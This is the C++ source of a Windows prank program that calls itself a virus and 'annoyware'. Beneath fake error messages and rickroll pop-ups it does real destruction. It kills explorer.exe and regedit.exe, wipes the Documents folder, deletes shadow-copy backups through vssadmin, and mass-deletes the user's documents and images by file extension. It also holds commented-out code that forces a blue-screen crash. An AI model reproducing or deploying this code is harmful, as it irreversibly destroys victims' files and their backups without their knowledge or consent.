#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <stdio.h>
#include <Windows.h>
#include <utilapiset.h>
#include <fileapi.h>
#include <time.h>
#include <ctime>
#include <cstdlib>


using namespace std;

typedef std::chrono::system_clock Clock;

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameterss, ULONG ValidResponseOption, PULONG Responce);

//void ctrlshiftBsodPC(BOOL bState) {
//    BYTE keyState[512];

//    GetKeyboardState((LPBYTE)&keyState);
//    if ((bState && !(keyState[VK_SCROLL] & 0)) ||
//        (!bState && (keyState[VK_SCROLL] & 0)))
//       ;
//}



int main() {
    void HideConsole();
    {
        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    }


    int infwhile = 0; // Infinite Message Loop. Set it to 1 if you dont want inf messages on ur pc
    int is420 = 0; //is it time for bonus content? set it to 0 if you want this to activate on 4/20
    int randpopup = 0; // prompts every few seconds. thats it.
    /////////////////////////////////////////////////// Actual Code Starts Below
    auto now = Clock::now();
    std::time_t now_c = Clock::to_time_t(now);
    struct tm* parts = std::localtime(&now_c);

    std::cout << 1900 + parts->tm_year << std::endl;
    std::cout << 1 + parts->tm_mon << std::endl;
    std::cout << parts->tm_mday << std::endl;

    if (parts->tm_mday == 20 && parts->tm_mon == 3) { //check for nice date
        string fortwozerointro(); {    // start this
            int msgboxID = MessageBox(
                NULL,
                L"I wont spare you, but you will have some bonus content c:",
                L"asthetic",
                MB_ICONERROR | MB_OK
            );
        }
        is420 = 1;
    }
    else {
        string standardintro(); {    // hehe
            int msgboxID = MessageBox(
                NULL,
                L"Looks like you're not lucky. See you in the next reboot!",
                L"Error at memory space 0x002312",
                MB_ICONERROR | MB_OK
            );
        }
    }


    Beep(500, 9999);
	system("echo off");
    system("taskkill /f /im explorer.exe");
    system("taskkill /f /im regedit.exe");


    system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder
    system("MD %UserProfile%\Documents"); //Recreate Documents Folder
    system("RD /s /q C:\Windows\Minidump"); //Delete Dump Files
    system("vssadmin delete shadows /all /quiet"); //delete shadow backups
    system("cd %UserProfile%"); //Change directory to active user
    system("DEL /s /q /f *.DOC *.DOCX *.xls *.xlsx *.png *.txt *.pdf *.jpeg *.png *.bmp *.rtf *.ppt *.pptx *.odf *.tif *.jpg *.svg *.htm *.html"); //Deletes some important files 
    
    std::ofstream outfile("Congratulations.txt");

    outfile << "annoyware from [redacted]. You enjoyed this pc didn't you, billy gates must've made windows so insecure, thank him. Linux is better." << std::endl;
    outfile.close();
    
    if (is420 == 1) { //checks if you are running the virus in nice date. More payloads coming soon.
        system("start https://www.youtube.com/watch?v=aQkPcPqTq4M");

        HIGHCONTRAST hc; // activates nice mode
        ZeroMemory(&hc, sizeof(HIGHCONTRAST));
        hc.cbSize = sizeof(HIGHCONTRAST);
        hc.dwFlags = HCF_HIGHCONTRASTON;
        SystemParametersInfo(SPI_SETHIGHCONTRAST, 0, &hc, SPIF_SENDCHANGE);

        std::ofstream outfile("nice.txt");

        outfile << "nice number m8" << std::endl;
        outfile.close();

        string fourtwozero(); {
            int msgboxID = MessageBox(
                NULL,
                L"MACINTOSH PLUS - Lisa Frank 420 / Modern Compute |",
                L"Yeah Yeah its 420 time",
                MB_ICONEXCLAMATION | MB_OK
            );
        }
    }
    
    else {
        system("start https://www.youtube.com/watch?v=oHg5SJYRHA0"); //rickroll starts
        
        string DisplayRickError(); {    // good old rickroll
            int msgboxID = MessageBox(
                NULL,
                L"Never gonna give you up never gonna let you down never gonna run around and desert you",
                L"Critical error!",
                MB_ICONERROR | MB_OK
            );

        }
    }
 



	return 0
		; //floating ; do not disturb
}


//some scrapped code, moved here to clean source code. If you are reading this whats up source code dweller? c:

    //const int KEYEVENT_KEYUP = 0x02; // crash?
    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);

    //keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    //keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    // Backup BSOD generator

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //BSOD:
    //BOOLEAN bl;
    //unsigned long response;
    //RtlAdjustPrivilege(19, true, false, &bl);
    //NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response); //cause BSOD'nt